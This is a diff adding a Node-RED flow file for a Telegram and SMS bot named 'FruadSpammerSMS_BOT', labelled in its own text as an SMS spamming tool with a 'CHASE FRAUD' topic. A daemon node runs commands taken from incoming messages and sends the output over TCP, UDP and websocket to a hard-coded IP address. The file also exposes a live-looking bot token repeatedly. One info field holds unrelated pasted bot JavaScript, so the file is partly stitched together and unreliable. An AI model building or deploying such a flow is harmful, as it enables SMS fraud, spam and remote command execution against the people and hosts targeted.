@@ -1,0 +1,421 @@
+[
+    {
+        "id": "aa315711cd735ae4",
+        "type": "tab",
+        "label": "Flow 1",
+        "disabled": false,
+        "info": "",
+        "env": []
+    },
+    {
+        "id": "1d25d38450502b41",
+        "type": "tab",
+        "label": "Flow 2",
+        "disabled": false,
+        "info": "",
+        "env": []
+    },
+    {
+        "id": "1bc2c889483f4fce",
+        "type": "tab",
+        "label": "Flow 3",
+        "disabled": false,
+        "info": "",
+        "env": []
+    },
+    {
+        "id": "fd6957e532d77309",
+        "type": "group",
+        "z": "aa315711cd735ae4",
+        "style": {
+            "stroke": "#999999",
+            "stroke-opacity": "1",
+            "fill": "none",
+            "fill-opacity": "1",
+            "label": true,
+            "label-position": "nw",
+            "color": "#a4a4a4"
+        },
+        "nodes": [
+            "238b05802346f890",
+            "2c786f750a14b769",
+            "1b1ad8934a18e7a2",
+            "1d61b19da51f241b",
+            "6a6b2b7da860f6ac",
+            "fa0254d37cb74586",
+            "a4a5e5394691d153",
+            "ca176420ac258527",
+            "64d4effa539af1f6",
+            "cfdae142901761a1",
+            "826178121619fbd2",
+            "36e05e674754ab7b",
+            "6c99fbcfe2e72d5d",
+            "fe9c2a661c76d166",
+            "7a7df096b012462b",
+            "0cbcc7ba6399406a",
+            "d4b7f8fb77908405"
+        ],
+        "x": -6,
+        "y": -1,
+        "w": 1102,
+        "h": 1102
+    },
+    {
+        "id": "2e2f1e9ef2853232",
+        "type": "websocket-client",
+        "path": "https://155.138.231.155:1880/bot2113503394:AAHEa_io6A5poWy__tyUsztqbHVL0vEmlF8/getUpfate",
+        "tls": "",
+        "wholemsg": "false",
+        "hb": "3"
+    },
+    {
+        "id": "b9ea6d5c237b2d0c",
+        "type": "telegram bot",
+        "botname": "FruadSpammerSMS_BOT",
+        "usernames": "FruadTheBot",
+        "chatids": "1715904675",
+        "baseapiurl": "https://155.138.231.155:1880/bot2113503394:AAHEa_io6A5poWy__tyUsztqbHVL0vEmlF8/setWebhook",
+        "updatemode": "polling",
+        "pollinterval": "20",
+        "usesocks": false,
+        "sockshost": "",
+        "socksport": "6667",
+        "socksusername": "anonymous",
+        "sockspassword": "",
+        "bothost": "",
+        "botpath": "",
+        "localbotport": "8443",
+        "publicbotport": "8443",
+        "privatekey": "",
+        "certificate": "",
+        "useselfsignedcertificate": false,
+        "sslterminated": false,
+        "verboselogging": true
+    },
+    {
+        "id": "829afc388ce917f3",
+        "type": "chatbot-telegram-node",
+        "botname": "FruadSpammerSMS_BOT",
+        "usernames": "1715904675",
+        "providerToken": "2113503394:AAHEa_io6A5poWy__tyUsztqbHVL0vEmlF8",
+        "polling": "1000",
+        "store": "",
+        "log": "msg.log",
+        "debug": true,
+        "webHook": "https://api.telegram.org/bot2113503394:AAHEa_io6A5poWy__tyUsztqbHVL0vEmlF8/setWebhook",
+        "connectMode": "polling",
+        "info": "SmS Spamming .\r\nThis bot isnt responsible for illegal behavior."
+    },
+    {
+        "id": "ff21edfbfabb7ad7",
+        "type": "websocket-listener",
+        "path": "msg.payload",
+        "wholemsg": "true"
+    },
+    {
+        "id": "238b05802346f890",
+        "type": "sms-in",
+        "z": "aa315711cd735ae4",
+        "g": "fd6957e532d77309",
+        "name": "",
+        "x": 130,
+        "y": 160,
+        "wires": [
+            [
+                "1b1ad8934a18e7a2",
+                "a4a5e5394691d153"
+            ]
+        ]
+    },
+    {
+        "id": "2c786f750a14b769",
+        "type": "sms-out",
+        "z": "aa315711cd735ae4",
+        "g": "fd6957e532d77309",
+        "name": "",
+        "topic": "1**********",
+        "x": 100,
+        "y": 500,
+        "wires": []
+    },
+    {
+        "id": "1b1ad8934a18e7a2",
+        "type": "daemon",
+        "z": "aa315711cd735ae4",
+        "g": "fd6957e532d77309",
+        "name": "",
+        "command": "msg.payload",
+        "args": "msg.start",
+        "autorun": true,
+        "cr": true,
+        "redo": true,
+        "op": "buffer",
+        "closer": "SIGTERM",
+        "x": 100,
+        "y": 340,
+        "wires": [
+            [
+                "2c786f750a14b769",
+                "6a6b2b7da860f6ac",
+                "a4a5e5394691d153",
+                "826178121619fbd2"
+            ],
+            [
+                "1d61b19da51f241b",
+                "64d4effa539af1f6"
+            ],
+            [
+                "ca176420ac258527"
+            ]
+        ]
+    },
+    {
+        "id": "1d61b19da51f241b",
+        "type": "tcp out",
+        "z": "aa315711cd735ae4",
+        "g": "fd6957e532d77309",
+        "host": "155.138.231.155",
+        "port": "1337",
+        "beserver": "server",
+        "base64": false,
+        "end": false,
+        "name": "",
+        "x": 360,
+        "y": 160,
+        "wires": [],
+        "inputLabels": [
+            "\"sent\": msg.payload"
+        ]
+    },
+    {
+        "id": "6a6b2b7da860f6ac",
+        "type": "flow-asserter out",
+        "z": "aa315711cd735ae4",
+        "g": "fd6957e532d77309",
+        "name": "",
+        "x": 170,
+        "y": 560,
+        "wires": [
+            [
+                "2c786f750a14b769",
+                "fa0254d37cb74586",
+                "cfdae142901761a1"
+            ]
+        ],
+        "inputLabels": [
+            "\"sent\": 3102294065105, "
+        ],
+        "outputLabels": [
+            "msg.payload"
+        ],
+        "info": "{           \r\n    \"sent\": 3102294065105,\r\n    \"received\": 1457110722000, \r\n    \"topic\": CHASE FRAUD, \r\n    \"payload\": \"Fuck a duck\"\r\n}\r\n"
+    },
+    {
+        "id": "fa0254d37cb74586",
+        "type": "udp out",
+        "z": "aa315711cd735ae4",
+        "g": "fd6957e532d77309",
+        "name": "",
+        "addr": "155.138.231.155",
+        "iface": "",
+        "port": "1880",
+        "ipv": "udp4",
+        "outport": "1880",
+        "base64": false,
+        "multicast": "false",
+        "x": 140,
+        "y": 700,
+        "wires": []
+    },
+    {
+        "id": "a4a5e5394691d153",
+        "type": "websocket out",
+        "z": "aa315711cd735ae4",
+        "g": "fd6957e532d77309",
+        "name": "",
+        "server": "",
+        "client": "2e2f1e9ef2853232",
+        "x": 440,
+        "y": 40,
+        "wires": []
+    },
+    {
+        "id": "ca176420ac258527",
+        "type": "link out",
+        "z": "aa315711cd735ae4",
+        "g": "fd6957e532d77309",
+        "name": "",
+        "mode": "link",
+        "links": [],
+        "x": 315,
+        "y": 420,
+        "wires": []
+    },
+    {
+        "id": "64d4effa539af1f6",
+        "type": "flow-asserter out",
+        "z": "aa315711cd735ae4",
+        "g": "fd6957e532d77309",
+        "name": "",
+        "x": 140,
+        "y": 280,
+        "wires": [
+            [
+                "a4a5e5394691d153"
+            ]
+        ],
+        "inputLabels": [
+            "test"
+        ],
+        "outputLabels": [
+            "test"
+        ]
+    },
+    {
+        "id": "cfdae142901761a1",
+        "type": "websocket out",
+        "z": "aa315711cd735ae4",
+        "g": "fd6957e532d77309",
+        "name": "",
+        "server": "",
+        "client": "2e2f1e9ef2853232",
+        "x": 510,
+        "y": 720,
+        "wires": []
+    },
+    {
+        "id": "826178121619fbd2",
+        "type": "telegram sender",
+        "z": "aa315711cd735ae4",
+        "g": "fd6957e532d77309",
+        "name": "",
+        "bot": "b9ea6d5c237b2d0c",
+        "haserroroutput": true,
+        "outputs": 2,
+        "x": 220,
+        "y": 800,
+        "wires": [
+            [
+                "36e05e674754ab7b"
+            ],
+            [
+                "ca176420ac258527"
+            ]
+        ],
+        "inputLabels": [
+            "msg.payload"
+        ]
+    },
+    {
+        "id": "36e05e674754ab7b",
+        "type": "telegram sender",
+        "z": "aa315711cd735ae4",
+        "g": "fd6957e532d77309",
+        "name": "",
+        "bot": "b9ea6d5c237b2d0c",
+        "haserroroutput": true,
+        "outputs": 2,
+        "x": 410,
+        "y": 780,
+        "wires": [
+            [],
+            []
+        ]
+    },
+    {
+        "id": "6c99fbcfe2e72d5d",
+        "type": "chatbot-telegram-menu",
+        "z": "aa315711cd735ae4",
+        "g": "fd6957e532d77309",
+        "bot": "829afc388ce917f3",
+        "items": [
+            {
+                "command": "/sms",
+                "description": "The  Play"
+            }
+        ],
+        "x": 220,
+        "y": 1020,
+        "wires": [],
+        "info": "\t// }\r\n\t});\r\n\r\n\tbot.on('message', function(msg){\r\n\t\t// Actions to SAVE\r\n\t\tif(edit.edit_actions['add_actions'][\"userid\"+msg.from.id] != undefined){\r\n\t\t\tvar content;\r\n\t\t\tvar content_type;\r\n\t\t\tif(msg.text != undefined){\r\n\t\t\t\tcontent_type = \"text\";\r\n\t\t\t\tcontent = msg.text;\r\n\t\t\t} else if(msg.voice != undefined){\r\n\t\t\t\tcontent_type = \"voice\";\r\n\t\t\t\tcontent = msg.voice.file_id;\r\n\t\t\t} else if(msg.sticker != undefined){\r\n\t\t\t\tcontent_type = \"sticker\";\r\n\t\t\t\tcontent = msg.sticker.file_id;\r\n\t\t\t} else if(msg.photo != undefined){\r\n\t\t\t\tcontent_type = \"photo\";\r\n\t\t\t\tcontent = msg.photo[msg.photo.length-1].file_id;\r\n\t\t\t} else if(msg.video != undefined){\r\n\t\t\t\tcontent_type = \"video\";\r\n\t\t\t\tcontent = msg.video.file_id;\r\n\t\t\t} else if(msg.location != undefined){\r\n\t\t\t\tcontent_type = \"location\";\r\n\t\t\t\tcontent = msg.location.longitude + \"_\" + msg.location.latitude;\r\n\t\t\t} else if(msg.document != undefined){\r\n\t\t\t\tcontent_type = \"document\";\r\n\t\t\t\tcontent = msg.document.file_id;\r\n\t\t\t} else if(msg.contact != undefined){\r\n\t\t\t\tcontent_type = \"contact\";\r\n\t\t\t\tvar name = msg.contact.first_name;\r\n\t\t\t\tif(name == '')\r\n\t\t\t\t\tname = msg.contact.last_name;\r\n\t\t\t\tcontent = msg.contact.phone_number + \"_\" + name;\r\n\t\t\t}\r\n\r\n\t\t\tedit.edit_actions['add_actions'][\"userid\"+msg.from.id].actions.push({'type':content_type, 'value':content});\r\n\r\n\t\t\tbot.deleteMessage(msg.from.id, edit.edit_actions['add_actions'][\"userid\"+msg.from.id].btn_save_id).then(() => {\r\n\t\t\t\tvar key = edit.edit_actions['add_actions'][\"userid\"+msg.from.id].catalog;\r\n\t\t\t\tvar index = init.menu[key].values.indexOf(edit.edit_actions['add_actions'][\"userid\"+msg.from.id].menu_item);\r\n\t\t\t\tbot.sendMessage(msg.from.id, init.MSG_ADD_ACTION_REQ, init.options_with_save(init.menu[key].values[index-1], checkAdmins(msg.from), msg.from.id)).then(btn_save => {\r\n\t\t\t\t\tedit.edit_actions['add_actions'][\"userid\"+msg.from.id].btn_save_id = btn_save.message_id;\r\n\t\t\t\t});\r\n\t\t\t});\r\n\t\t\treturn;\r\n\t\t}\r\n\r\n\t\tif(msg.text == undefined)\r\n\t\t\treturn;\r\n\r\n\t\t/* Start */\r\n\t\tif(msg.text == \"/start\"){\r\n\t\t\tbot.sendMessage(msg.from.id, init.MSG_START, init.options(undefined, checkAdmins(msg.from)));\r\n\t\t\treturn edit.reset_variables(msg.from.id);\r\n\t\t}\r\n\r\n\t\t/* EXPORT from config to data */\r\n\t\tif(msg.text.indexOf(\"/export \") == 0 && checkAdmins(msg.from) == 1){\r\n\t\t\tvar file = msg.text.split(' ')[1];\r\n\t\t\tif(file != undefined && file != \"\")\r\n\t\t\t\timpex.export_configuration(bot, file);\r\n\t\t}\r\n\r\n\t\t/* IMPORT from data to config */\r\n\t\tif(msg.text.indexOf(\"/import \") == 0 && checkAdmins(msg.from) == 1){\r\n\t\t\tvar file = msg.text.split(' ')[1];\r\n\t\t\tif(file != undefined && file != \"\")\r\n\t\t\t\timpex.import_configuration(bot, file, msg);\r\n\t\t}\r\n\r\n\t\t/* Back button */\r\n\t\tif(msg.text.indexOf(emoji.get('arrow_left')+\" \") == 0){\r\n\t\t\tvar catalog = msg.text.split(emoji.get('arrow_left')+\" \")[1];\r\n\t\t\tif(init.menu[catalog] != undefined){\r\n\t\t\t\tbot.sendMessage(msg.from.id, init.MSG_BACK(catalog), init.options(catalog, checkAdmins(msg.from)));\r\n\t\t\t}\r\n\t\t\treturn edit.reset_variables(msg.from.id);\r\n\t\t}\r\n\r\n\t\t/* Button */\r\n\t\tif(init.menu[msg.text] != undefined){\r\n\t\t\tvar message = init.MSG_DEFAULT;\r\n\t\t\t\r\n\t\t\tif(init.menu[msg.text].actions.length > 0)\r\n\t\t\t\tsendActions(bot, msg);\r\n\t\t\telse\r\n\t\t\t\tbot.sendMessage(msg.from.id, message, init.options(msg.text, checkAdmins(msg.from)));\r\n\t\t\t\r\n\t\t\treturn edit.reset_variables(msg.from.id);\r\n\t\t}\r\n\r\n\t\t/* Button without action */\r\n\t\tif(init.menu[msg.text.split(\"|\")[0]] != undefined && msg.text.split(\"|\")[1] == \"wa\"){\r\n\t\t\tvar message = init.MSG_DEFAULT;\r\n\t\t\t\r\n\t\t\tbot.sendMessage(msg.from.id, message, init.options(msg.text.split(\"|\")[0], checkAdmins(msg.from)));\r\n\t\t\t\r\n\t\t\treturn edit.reset_variables(msg.from.id);\r\n\t\t}\r\n\r\n\t\t/* Delete menu item */\r\n\t\tif(msg.text.indexOf(emoji.get('heavy_minus_sign')+\" \") == 0){\r\n\t\t\tvar key = msg.text.split(\"delete \")[1].split(\"|\")[0];\r\n\t\t\tif(checkAdmins(msg.from) == 1){\r\n\t\t\t\tvar index = msg.text.split(\"delete \")[1].split(\"|\")[1];\r\n\t\t\t\tvar item = init.menu[key].values[index-1];\r\n\t\t\t\tedit.deleteItem(key, item, index).then(() => {\r\n\t\t\t\t\tbot.sendMessage(msg.from.id, init.MSG_DELETE_ITEM(key, item), init.options(key, checkAdmins(msg.from)));\r\n\t\t\t\t}, error => {\r\n\t\t\t\t\tbot.sendMessage(msg.from.id, init.MSG_DELETE_FAIL(key, item, error), init.options(key, checkAdmins(msg.from)));\r\n\t\t\t\t\tbot.sendMessage(msg.from.id, init.MSG_DESYNC, init.options(key, checkAdmins(msg.from)));\r\n\t\t\t\t});\t\r\n\t\t\t} else {\r\n\t\t\t\tbot.sendMessage(msg.from.id, init.MSG_EDIT_OFF, init.options(key, checkAdmins(msg.from)));\r\n\t\t\t}\r\n\t\t\treturn edit.reset_variables(msg.from.id);\r\n\t\t}\r\n\r\n\t\t/* Add menu item */\r\n\t\tif(msg.text.indexOf(emoji.get('heavy_plus_sign')+\" \") == 0){\r\n\t\t\tvar key = msg.text.split(\"add button to \")[1].split(\" ]\")[0];\r\n\t\t\tvar message = init.MSG_ADD_ITEM_REQ;\r\n\t\t\tif(checkAdmins(msg.from) != 1)\r\n\t\t\t\tmessage = init.MSG_EDIT_OFF;\r\n\t\t\telse\r\n\t\t\t\tedit.set_variable('add_item', msg.from.id, { 'catalog': key, 'parrent': init.menu[key].parrent });\r\n\r\n\t\t\tbot.sendMessage(msg.from.id, message, init.options(key, checkAdmins(msg.from)));\r\n\t\t\treturn edit.reset_variables(msg.from.id, 'add_item');\r\n\t\t}\r\n\r\n\t\t/* Edit actions menu item */\r\n\t\tif(msg.text.indexOf(emoji.get('writing_hand')+\" \") == 0){\r\n\t\t\tvar key = msg.text.split(\"edit actions answer \")[1].split(\"|\")[0];\r\n\t\t\tvar index = msg.text.split(\"edit actions answer \")[1].split(\"|\")[1];\r\n\t\t\tvar message = init.MSG_ADD_ACTION_REQ;\r\n\t\t\tif(checkAdmins(msg.from) != 1)\r\n\t\t\t\tmessage = init.MSG_EDIT_OFF;\r\n\t\t\telse\r\n\t\t\t\tedit.set_variable('add_actions', msg.from.id, { 'catalog': key } );\r\n\r\n\t\t\tbot.sendMessage(msg.from.id, message, init.options_with_save(init.menu[key].values[index-1], checkAdmins(msg.from), msg.from.id)).then(btn_save => { \r\n\t\t\t\tedit.set_variable('add_actions', msg.from.id, { 'catalog': key, 'menu_item': init.menu[key].values[index-1], 'btn_save_id': btn_save.message_id, 'actions': [] });\r\n\t\t\t});\r\n\t\t\treturn edit.reset_variables(msg.from.id, 'add_actions');\r\n\t\t}\r\n\r\n\t\t// Input menu item for add new item\r\n\t\tif(edit.edit_actions.add_item[\"userid\"+msg.from.id]){\r\n\t\t\tedit.addItem(msg.from.id, msg.text).then(key => {\r\n\t\t\t\tbot.sendMessage(msg.from.id, init.MSG_ADD_ITEM(msg.text), init.options(key, checkAdmins(msg.from)));\r\n\t\t\t}, error => {\r\n\t\t\t\tbot.sendMessage(msg.from.id, init.MSG_ADD_FAIL(msg.text, error), init.options(undefined, checkAdmins(msg.from)));\r\n\t\t\t\tbot.sendMessage(msg.from.id, init.MSG_DESYNC, init.options(undefined, checkAdmins(msg.from)));\r\n\t\t\t});\t\r\n\t\t\t\r\n\t\t\treturn edit.reset_variables(msg.from.id);\r\n\t\t}\r\n\t});\r\n\r\n\tbot.on('callback_query', function (msg) {\r\n\t\tif(msg.data.indexOf('Cancel') !== -1 && edit.edit_actions['add_actions'][\"userid\"+msg.from.id] != undefined){\r\n\t\t\tbot.deleteMessage(msg.from.id, edit.edit_actions['add_actions'][\"userid\"+msg.from.id].btn_save_id).then(() => {\r\n\t\t\t\tbot.sendMessage(msg.from.id, init.MSG_EDIT_ITEM_CANC, init.options(edit.edit_actions['add_actions'][\"userid\"+msg.from.id].catalog, checkAdmins(msg.from)));\r\n\t\t\t\tedit.reset_variables(msg.from.id); \r\n\t\t\t});\r\n\t\t}\r\n\r\n\t\tif(msg.data.indexOf('Save') !== -1 && edit.edit_actions['add_actions'][\"userid\"+msg.from.id] != undefined){\r\n\t\t\tbot.deleteMessage(msg.from.id, edit.edit_actions['add_actions'][\"userid\"+msg.from.id].btn_save_id).then(() => {\r\n\t\t\t\tedit.saveActions(msg.from.id).then(() => {\r\n\t\t\t\t\tbot.sendMessage(msg.from.id, init.MSG_EDIT_ITEM(edit.edit_actions['add_actions'][\"userid\"+msg.from.id].menu_item), init.options(edit.edit_actions['add_actions'][\"userid\"+msg.from.id].catalog, checkAdmins(msg.from)));\r\n\t\t\t\t\tedit.reset_variables(msg.from.id); \r\n\t\t\t\t}, error => {\r\n\t\t\t\t\tbot.sendMessage(msg.from.id, init.MSG_EDIT_FAIL(edit.edit_actions['add_actions'][\"userid\"+msg.from.id].menu_item, error), init.options(edit.edit_actions['add_actions'][\"userid\"+msg.from.id].catalog, checkAdmins(msg.from)));\r\n\t\t\t\t\tedit.reset_variables(msg.from.id); \r\n\t\t\t\t});\r\n\t\t\t});\r\n\t\t}\r\n\t});\r\n}\r\n\r\nfunction checkAdmins(from){\r\n\tvar mode = init.MODE;\r\n\tif(init.admins.length > 0 && \r\n\t   init.admins.indexOf(from.id) == -1 && \r\n\t   init.admins.indexOf(from.username) == -1){\r\n\r\n\t\tmode = 0;\r\n\t}\r\n\t\r\n\treturn mode;\r\n}\r\n\r\nfunction sendActions(bot, msg, _index = 0){\r\n\tif(init.menu[msg.text].actions[_index] == undefined)\r\n\t\treturn;\r\n\r\n\tvar content = init.menu[msg.text].actions[_index].value;\r\n\r\n\tif(init.menu[msg.text].actions[_index].type == \"text\"){\r\n\t\tbot.sendMessage(msg.from.id, content, init.options(msg.text, checkAdmins(msg.from))).then(() => { sendActions(bot, msg, _index+1) });\r\n\t} else if(init.menu[msg.text].actions[_index].type == \"photo\"){\r\n\t\tbot.sendPhoto(msg.from.id, content).then(() => { sendActions(bot, msg, _index+1) }).catch(error => {\r\n\t\t\tconsole.log(\"ERROR\", \"sendActions\", msg.text, init.menu[msg.text].actions[_index].type, error.toString());\r\n\t\t});\r\n\t} else if(init.menu[msg.text].actions[_index].type == \"voice\"){\r\n\t\tbot.sendVoice(msg.from.id, content).then(() => { sendActions(bot, msg, _index+1) }).catch(error => {\r\n\t\t\tconsole.log(\"ERROR\", \"sendActions\", msg.text, init.menu[msg.text].actions[_index].type, error.toString());\r\n\t\t});\r\n\t} else if(init.menu[msg.text].actions[_index].type == \"sticker\"){\r\n\t\tbot.sendSticker(msg.from.id, content).then(() => { sendActions(bot, msg, _index+1) }).catch(error => {\r\n\t\t\tconsole.log(\"ERROR\", \"sendActions\", msg.text, init.menu[msg.text].actions[_index].type, error.toString());\r\n\t\t});\r\n\t} else if(init.menu[msg.text].actions[_index].type == \"video\"){\r\n\t\tbot.sendVideo(msg.from.id, content).then(() => { sendActions(bot, msg, _index+1) }).catch(error => {\r\n\t\t\tconsole.log(\"ERROR\", \"sendActions\", msg.text, init.menu[msg.text].actions[_index].type, error.toString());\r\n\t\t});\r\n\t} else if(init.menu[msg.text].actions[_index].type == \"location\"){\r\n\t\tvar longitude_latitude = content.split('_');\r\n\t\tif(longitude_latitude.length < 2){\r\n\t\t\tconsole.log(\"ERROR\", \"sendActions\", msg.text, init.menu[msg.text].actions[_index].type, \"BED FORMAT\");\r\n\t\t\tsendActions(bot, msg, _index+1);\r\n\t\t\treturn;\r\n\t\t}\r\n\r\n\t\tbot.sendLocation(msg.from.id, longitude_latitude[0], longitude_latitude[1]).then(() => { sendActions(bot, msg, _index+1) }).catch(error => {\r\n\t\t\tconsole.log(\"ERROR\", \"sendActions\", msg.text, error.toString());\r\n\t\t});\r\n\t} else if(init.menu[msg.text].actions[_index].type == \"document\"){\r\n\t\tbot.sendDocument(msg.from.id, content).then(() => { sendActions(bot, msg, _index+1) }).catch(error => {\r\n\t\t\tconsole.log(\"ERROR\", \"sendActions\", msg.text, init.menu[msg.text].actions[_index].type, error.toString());\r\n\t\t});\r\n\t} else if(init.menu[msg.text].actions[_index].type == \"contact\"){\r\n\t\tvar phone_name = content.split('_');\r\n\t\tif(phone_name.length < 2){\r\n\t\t\tconsole.log(\"ERROR\", \"sendActions\", msg.text, init.menu[msg.text].actions[_index].type, \"BED FORMAT\");\r\n\t\t\tsendActions(bot, msg, _index+1);\r\n\t\t\treturn;\r\n\t\t}\r\n\r\n\t\tbot.sendContact(msg.from.id, phone_name[0], phone_name[1]).then(() => { sendActions(bot, msg, _index+1) }).catch(error => {\r\n\t\t\tconsole.log(\"ERROR\", \"sendActions\", msg.text, error.toString());\r\n\t\t});\r\n\t}\r\n\r\n\treturn;\r\n}\r\n\r\nfunction printSyntax(message){\r\n\tif(message != undefined)\r\n\t\tconsole.log(message);\r\n\tconsole.log(\"Syntax: node bot.js menu.file data.folder [mode [username|telegram_id|all]]\");\r\n\tconsole.log(\"\\tmenu.file           \\t- file with menu catalogs in format:\");\r\n\tconsole.log(\"\\t                    \\t  parrent\"+init.DELIMETER+\"catalog\"+init.DELIMETER+\"menubutton[\"+init.DELIMETER+\"action]\");\r\n\tconsole.log(\"\\t                    \\t  You can set DELIMETER in init.js\");\r\n\tconsole.log(\"\\tdata.folder         \\t- path to folder with data for files from menu.file\");\r\n\tconsole.log(\"\\tmode                \\t- bot mode: \\\"edit\\\" for update menu\");\r\n\tconsole.log(\"\\tusername|telegram_id\\t- username or telegram_id users separated by commas which can edit menu\");\r\n\tconsole.log(\"\\t                    \\t  if mode=edit without this parameter, all users can edit menu\");\r\n\tconsole.log(\"\\t                    \\t  You can use \\\"all\\\" to all users can edit menu\");\r\n}"
+    },
+    {
+        "id": "fe9c2a661c76d166",
+        "type": "telegram command",
+        "z": "aa315711cd735ae4",
+        "g": "fd6957e532d77309",
+        "name": "",
+        "command": "msg.payload",
+        "description": "",
+        "registercommand": true,
+        "language": "",
+        "scope": "all_private_chats",
+        "bot": "b9ea6d5c237b2d0c",
+        "strict": true,
+        "hasresponse": true,
+        "useregex": false,
+        "removeregexcommand": false,
+        "outputs": 2,
+        "x": 210,
+        "y": 900,
+        "wires": [
+            [
+                "36e05e674754ab7b"
+            ],
+            [
+                "6c99fbcfe2e72d5d"
+            ]
+        ]
+    },
+    {
+        "id": "7a7df096b012462b",
+        "type": "chatbot-telegram-receive",
+        "z": "aa315711cd735ae4",
+        "g": "fd6957e532d77309",
+        "bot": "829afc388ce917f3",
+        "botProduction": "829afc388ce917f3",
+        "x": 210,
+        "y": 1060,
+        "wires": [
+            [
+                "6c99fbcfe2e72d5d",
+                "fa0254d37cb74586",
+                "cfdae142901761a1"
+            ]
+        ]
+    },
+    {
+        "id": "0cbcc7ba6399406a",
+        "type": "websocket in",
+        "z": "aa315711cd735ae4",
+        "g": "fd6957e532d77309",
+        "name": "",
+        "server": "",
+        "client": "2e2f1e9ef2853232",
+        "x": 710,
+        "y": 1000,
+        "wires": [
+            [
+                "6c99fbcfe2e72d5d"
+            ]
+        ]
+    },
+    {
+        "id": "d4b7f8fb77908405",
+        "type": "http in",
+        "z": "aa315711cd735ae4",
+        "g": "fd6957e532d77309",
+        "name": "",
+        "url": "http://155.138.231.155:1880",
+        "method": "get",
+        "upload": false,
+        "swaggerDoc": "",
+        "x": 500,
+        "y": 1060,
+        "wires": [
+            [
+                "6c99fbcfe2e72d5d"
+            ]
+        ]
+    }
+]
